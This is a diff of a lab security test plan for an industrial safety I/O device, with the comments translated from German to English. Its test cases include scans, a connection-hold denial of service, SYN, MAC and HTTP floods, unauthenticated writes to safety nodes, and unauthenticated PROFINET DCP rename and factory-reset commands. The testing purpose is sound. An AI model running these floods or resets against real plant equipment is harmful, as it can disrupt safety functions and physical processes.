@@ -1,45 +1,63 @@
 
-# ===== 0: Baseline =====
+- TC-RQ001-02 - Attack-Surface Enumeration on the Non-Safety Path
+ 
+sudo nmap -sS -sV -p- -T3 -oA  cm_rq001-02_tcp_srio $SRIO
+sudo nmap -sU --top-ports 200 -oA cm_rq001-02 _udp_srio $SRIO 
+nikto -h http://$SRIO  -output cm_rq001-02 _srio.html -Format html
+
+-----------------------------------------------------------------------------------------
+
+- TC-RQ003-01 - Baseline: What Evidence the Device Actually Collects
+
+curl -s http://$SRIO/devicestatus/errorlog/loglist/getdata  | tee cm_rq003-01_errorlog.json
+# In TIA: read I&M4 signature (before/after one param change).
+
+-----------------------------------------------------------------------------------------
+
+- TC-RQ003-04 - Time-Attribution Failure of Collected Evidence/ TC-RQ012-02 -  Cold-Start Deletion ⇄ TC-RQ003-04
+
+#   0: Baseline  
 curl -s http://$SRIO/systemtime/systick/getdata | tee cm_rq003-04_systick_00_baseline.txt
-curl -s http://$SRIO/devicestatus/errorlog/loglist | tee cm_rq003-04_log_00_baseline.json
+curl -s http://$SRIO/devicestatus/errorlog/loglist/getdata | tee cm_rq003-04_log_00_baseline.json
 
-# ===== 1: Event 1 =====
-# --> Patch-Cable (Switch-Port 2) kurz ziehen und wieder einstecken
+#   1: Event 1  
+# Short-circuit pin 1 and pin 3.
 
-# ===== 2: Readout after Event 1 =====
+#   2: Readout after Event 1  
 curl -s http://$SRIO/systemtime/systick/getdata | tee cm_rq003-04_systick_01_event1.txt
-curl -s http://$SRIO/devicestatus/errorlog/loglist | tee cm_rq003-04_log_01_event1.json
+curl -s http://$SRIO/devicestatus/errorlog/loglist/getdata | tee cm_rq003-04_log_01_event1.json
 
-# ===== 3: Cold-Restart =====
-# --> Power-In-Kabel am SRIO ziehen
-# --> 5-10 Sek. warten
-# --> Power-Kabel wieder einstecken, warten bis RDY-LED gruen und P-LED gruen
-
-# ===== 4: Readout after Cold-Restart =====
+#   3: Cold-Restart  
+# -> Disconnect the power input cable from the SRIO
+# --> Wait 5 -10 seconds
+# --> Reconnect the power cable; wait until the RDY LED and P LED turn green
+#   4: Readout after Cold-Restart  
 curl -s http://$SRIO/systemtime/systick/getdata | tee cm_rq003-04_systick_02_after_coldstart.txt
-curl -s http://$SRIO/devicestatus/errorlog/loglist | tee cm_rq003-04_log_02_after_coldstart.json
+curl -s http://$SRIO/devicestatus/errorlog/loglist/getdata | tee cm_rq003-04_log_02_after_coldstart.json
 
-# ===== 5: Event 2 =====
-# --> Patch-Kabel (Switch-Port 2) erneut kurz ziehen und wieder einstecken
+#   5: Event 2  
+# Short-circuit pin 1 and pin 3.
 
-# ===== 6: Readout after Event 2 =====
+#   6: Readout after Event 2  
 curl -s http://$SRIO/systemtime/systick/getdata | tee cm_rq003-04_systick_03_event2.txt
-curl -s http://$SRIO/devicestatus/errorlog/loglist | tee cm_rq003-04_log_03_event2.json
+curl -s http://$SRIO/devicestatus/errorlog/loglist/getdata | tee cm_rq003-04_log_03_event2.json
 
-# ===== 7: Evaluation =====
-echo "--- Log-comparison Baseline vs Event 1 ---"
+#   7: Evaluation  
+echo "  Log-comparison Baseline vs Event 1  "
 diff cm_rq003-04_log_00_baseline.json cm_rq003-04_log_01_event1.json
 
-echo "--- Log-comparison after Coldstart vs Event 2 ---"
+echo "  Log-comparison after Coldstart vs Event 2  "
 diff cm_rq003-04_log_02_after_coldstart.json cm_rq003-04_log_03_event2.json
 
-echo "--- Systick-comparison ---"
+echo "  Systick-comparison  "
 echo "Baseline:        $(cat cm_rq003-04_systick_00_baseline.txt)"
-echo "Nach Event 1:    $(cat cm_rq003-04_systick_01_event1.txt)"
-echo "Nach Coldstart:  $(cat cm_rq003-04_systick_02_after_coldstart.txt)"
-echo "Nach Event 2:    $(cat cm_rq003-04_systick_03_event2.txt)"
-----
-RQ-004-01
+echo "After Event 1:    $(cat cm_rq003-04_systick_01_event1.txt)"
+echo "After Coldstart:  $(cat cm_rq003-04_systick_02_after_coldstart.txt)"
+echo "After Event 2:    $(cat cm_rq003-04_systick_03_event2.txt)"
+
+-----------------------------------------------------------------------------------------
+
+- TC-RQ004-01 -  Identification-Surface Inventory (SW + Data)
 
 for p in deviceinfo/hwversion deviceinfo/hwrevision deviceinfo/swrevision \
   deviceinfo/swinfo/cpubootloaderversion deviceinfo/swinfo/scpuversion \
@@ -48,17 +66,14 @@ for p in deviceinfo/hwversion deviceinfo/hwrevision deviceinfo/swrevision \
   curl -s http://$SRIO/$p/getdata
   echo
 done | tee cm_rq004-01_inventory.txt
---
-sudo tshark -i "$IFACE" -f "host $SRIO and tcp port 80" -w cm_rq004-03_http.pcap &
-TSHARK_PID=$!
-sleep 1
-curl -s http://$SRIO/deviceinfo/swrevision/getdata >/dev/null
-sleep 1
-sudo kill $TSHARK_PID
 
-sslscan --show-certificate $SRIO:80 > cm_rq004-03_sslscan.txt 2>&1
----
-RQ-006-01
+
+#TIA: I&M0, I&M5, I&M4 for data
+
+-----------------------------------------------------------------------------------------
+
+- TC-RQ006-01 -  Installed-Software Inventory Enumeration
+
 for p in deviceinfo/swinfo/cpubootloaderversion deviceinfo/swinfo/scpuversion \
   deviceinfo/swinfo/scpubootloaderversion deviceinfo/swrevision firmware/version \
   fieldbussetup/fieldbusfirmware; do
@@ -66,58 +81,184 @@ for p in deviceinfo/swinfo/cpubootloaderversion deviceinfo/swinfo/scpuversion \
   curl -s http://$SRIO/$p/getdata
   echo
 done | tee cm_rq006-01_installed.txt
----
-RQ-006-03
 
-sudo tshark -i "$IFACE" -Y "http && ip.addr==$SRIO" -w cm_rq006-03_http.pcap &
-TSHARK_PID=$!
-sleep 1
-curl -s http://$SRIO/deviceinfo/swinfo/scpuversion/getdata >/dev/null
-sleep 1
-sudo kill $TSHARK_PID
+#I&M
 
-sslscan --show-certificate $SRIO:80 > cm_rq006-03_sslscan.txt 2>&1
----
-RQ-007-03
+-----------------------------------------------------------------------------------------
+
+- TC-RQ006-03 - Plaintext Inventory Exposure (Defense-in-Depth Observation)
+
+export SRIO=192.168.0.2
+sslscan --show-certificate $SRIO:80 | tee cm_rq006-03_sslscan.txt
+# In parallel:
+sudo tcpdump -i eth1 host $SRIO and port 80 -w cm_rq006-03_http.pcap &
+curl -s http://$SRIO/deviceinfo/swrevision/getdata
+kill %1
+# Open cm_rq006-03_http.pcap in Wireshark, right-click a packet >
+# Follow > HTTP Stream, to show the plaintext content.
+
+-----------------------------------------------------------------------------------------
+
+- TC-RQ007-01 -  Identification Availability & Accessibility Baseline
+
+# Manual step on laptop (Port 4):
+# Open browser -> navigate to http://192.168.0.2/
+# -> IoT-Core Visualizer should load; navigate to the "deviceinfo" menu
+# -> Take a screenshot as proof of it being "human-readable, easily accessible"
+
+# Kali command (supplementary proof via curl):
+curl -s http://$SRIO/deviceinfo/swrevision/getdata | tee cm_rq007-01_swrev.txt
+
+-----------------------------------------------------------------------------------------
+
+- TC-RQ007-03 -  Connection-Hold Self-DoS on the Identification Interface
 
 export SRIO=192.168.0.2
 LOGDIR=~/rq007-03_evidence
 mkdir -p $LOGDIR
 cd $LOGDIR
 
-echo "=== Baseline: Verbindung funktioniert normal ===" | tee cm_rq007-03_00_baseline.txt
+echo " Baseline: Connection working normally" | tee cm_rq007-03_00_baseline.txt
 ( time curl -s --max-time 5 http://$SRIO/deviceinfo/swrevision/getdata ) >> cm_rq007-03_00_baseline.txt 2>&1
 cat cm_rq007-03_00_baseline.txt
 
-echo "=== Beide Slots blockieren ==="
+echo "Block both slots"
 for i in 1 2; do
   (exec 3<>/dev/tcp/$SRIO/80; printf 'GET /deviceinfo HTTP/1.1\r\nHost: x\r\n\r\n' >&3; sleep 600) &
 done
 jobs | tee cm_rq007-03_01_jobs.txt
 
-echo "=== 3. Versuch waehrend beide Slots belegt sind (erwartet: Timeout) ===" | tee cm_rq007-03_02_blocked.txt
+echo "3rd attempt while both slots are occupied (expected: timeout)" | tee cm_rq007-03_02_blocked.txt
 ( time curl -s --max-time 5 http://$SRIO/deviceinfo/swrevision/getdata ) >> cm_rq007-03_02_blocked.txt 2>&1
 cat cm_rq007-03_02_blocked.txt
 
-echo "=== Einen Slot freigeben ==="
+echo "Free up one slot"
 kill %1
 
-echo "=== Erneuter Versuch nach Freigabe (erwartet: wieder erfolgreich) ===" | tee cm_rq007-03_03_after_release.txt
+echo "Retry after freeing up slot (expected: successful again)" | tee cm_rq007-03_03_after_release.txt
 ( time curl -s --max-time 5 http://$SRIO/deviceinfo/swrevision/getdata ) >> cm_rq007-03_03_after_release.txt 2>&1
 cat cm_rq007-03_03_after_release.txt
 
-echo "=== Aufraeumen: zweiten Slot auch freigeben ==="
+echo "Cleanup: releasing second slot as well"
 kill %2
 
 echo ""
-echo "=== ZUSAMMENFASSUNG ==="
-echo "--- Baseline ---"; cat cm_rq007-03_00_baseline.txt
-echo "--- Waehrend blockiert ---"; cat cm_rq007-03_02_blocked.txt
-echo "--- Nach Freigabe ---"; cat cm_rq007-03_03_after_release.txt
+echo "SUMMARY"
+echo "- Baseline -"; cat cm_rq007-03_00_baseline.txt
+echo "- While blocked -"; cat cm_rq007-03_02_blocked.txt
+echo "- After release -"; cat cm_rq007-03_03_after_release.txt
 
---- 
-RQ007-02
+-----------------------------------------------------------------------------------------
 
+- TC-RQ008-01 - Software-Event Evidence Baseline
+
+export SRIO=192.168.0.2
+curl -s http://$SRIO/devicestatus/errorlog/loglist/getdata | tee cm_rq008-01_baseline.json
+curl -s http://$SRIO/firmware/version/getdata
+curl -s http://$SRIO/deviceinfo/swrevision/getdata
+
+# Trigger a benign, self-detected software event, e.g. a brief SysCom
+# interruption; short-circuit method from TC-RQ003-04.
+
+curl -s http://$SRIO/devicestatus/errorlog/loglist/getdata | tee cm_rq008-01_after_event.json
+diff cm_rq008-01_baseline.json cm_rq008-01_after_event.json
+
+#I&M0
+
+-----------------------------------------------------------------------------------------
+
+- TC-RQ009-01 - Config-Modification Evidence Surface Baseline
+
+export SRIO=192.168.0.2
+curl -s http://$SRIO/devicestatus/errorlog/loglist/getdata | tee cm_rq009-01_errorlog.json
+# In TIA: Online & Diagnostics > Identification & Maintenance > I&M4
+# (record the signature value: F_iParCRC + F_Par_CRC as hex)
+# Check both sources for any actor-identity field or absolute timestamp.
+
+-----------------------------------------------------------------------------------------
+
+- TC-RQ010-02 - Network/Layer-2 Flood Resilience
+
+export SRIO=192.168.0.2
+# 1. Establish baseline.
+# 2. Escalating flood:
+sudo hping3 --flood --rand-source $SRIO
+# then, in a separate run:
+sudo macof -i eth1
+# 3. Continuously observe the TIA watch table + diagnostics buffer; measure
+#    the time until passivation / restart.
+# 4. Stop the load; confirm restart requires acknowledgement.
+
+-----------------------------------------------------------------------------------------
+
+- TC-RQ010-04 - Application-Layer Flood & Domain-Separation Confirmation
+
+export SRIO=192.168.0.2
+siege -c 100 -t 10M -v http://$SRIO/deviceinfo/getdata -l cm_rq010-04_siege.log &
+# In parallel, observe the PROFIsafe connection / safety function in TIA
+# (watch table: qualifier, outputs).
+
+-----------------------------------------------------------------------------------------
+
+- TC-RQ011-01 - Read-Only Enforcement on the Non-Safety Interface 
+export SRIO=192.168.0.2
+
+# Attempt write access to all safety-relevant nodes listed in
+# 209_SRIO_CompSpec_Module_Com §5.3.1 (only /devicetag/applicationtag is
+# documented as writable; all others should be read-only):
+curl -s -X POST http://$SRIO/safecom/f_address/setdata -d '{"value":123}' -w "%{http_code}\n"
+curl -s -X POST http://$SRIO/io/do/port7/pin4/digital_output/setdata -d '{"value":true}' -w "%{http_code}\n"
+curl -s -X POST http://$SRIO/devicetag/applicationtag/setdata -d '"factoryXYZ"' -w "%{http_code}\n"
+
+-----------------------------------------------------------------------------------------
+
+- !!TC-RQ011-02 - Unauthenticated Configuration-Protocol Factory Reset !! Take care when performing
+
+pip install pnio_dcp
+# 1. Baseline: read the current device name/IP via DCP-Identify
+python3 -c "import pnio_dcp; c = pnio_dcp.DCP('eth1'); print(c.identify_all())"
+
+# 2. DCP-Set (name change) WITHOUT any credentials:
+python3 -c "import pnio_dcp; c = pnio_dcp.DCP('eth1'); c.set_name_of_station('AA:BB:CC:DD:EE:FF', 'test-hijack')"
+
+# 3. DCP-Reset-to-Factory (Mode 2, mandatory):
+python3 -c "import pnio_dcp; c = pnio_dcp.DCP('eth1'); c.reset_to_factory('AA:BB:CC:DD:EE:FF')"
+
+# 4. Check the TIA watch table for connection loss / passivation.
+
+-----------------------------------------------------------------------------------------
+
+- TC-RQ013-01 - Current-Version-Only Confirmation
+
+curl -s http://$SRIO/deviceinfo/swrevision/getdata
+curl -s http://$SRIO/firmware/version/getdata
+# In TIA: Online & Diagnostics > Identification & Maintenance > I&M0, I&M5
+# Explicitly search all responses for any ‘version history’ / ‘previous
+# version’ field (none documented).
+
+-----------------------------------------------------------------------------------------
+
+- TC-RQ014-02 - Cleartext Confidentiality of the Tracing Log
+
+export SRIO=192.168.0.2
+sslscan --show-certificate $SRIO:80 | tee cm_rq014-02_sslscan.txt
+sudo tcpdump -i eth1 host $SRIO and port 80 -w cm_rq014-02_log.pcap &
+curl -s http://$SRIO/devicestatus/errorlog/loglist/getdata
+kill %1
+# Open cm_rq014-02_log.pcap in Wireshark > Follow > HTTP Stream to show
+# the plaintext log content.
+
+----------------------------------------------------------------------------------------- 
+
+- TC-RQ014-03 - Access-Control Mechanism Probe
+
+export SRIO=192.168.0.2
+nikto -h http://$SRIO -output cm_rq014-03_nikto.html -Format html
+# Search the output for any login/auth endpoints.
+
+zaproxy -daemon -host 127.0.0.1 -port 8090 -config api.disablekey=true &
+curl "http://127.0.0.1:8090/JSON/spider/action/scan/?url=http://$SRIO/"
+# check ZAP's discovered URLs / responses for any 401/403 status codes
 
 
 
